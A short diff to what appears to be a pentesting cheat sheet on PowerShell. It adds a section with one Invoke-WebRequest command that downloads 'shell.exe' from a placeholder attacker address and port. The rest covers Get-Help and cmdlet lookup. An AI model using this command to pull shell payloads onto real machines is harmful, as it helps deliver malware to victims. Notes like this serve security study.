@@ -21,6 +21,13 @@ Get-Help ${cmdlet}
 
 Now a man-page like output should help discovering how to use it.
 
+
+## Downloading a file from a URI
+
+```
+Invoke-WebRequest -Uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
+```
+
 ## Useful commands cmdlets
 
 searching, similar to `find`:
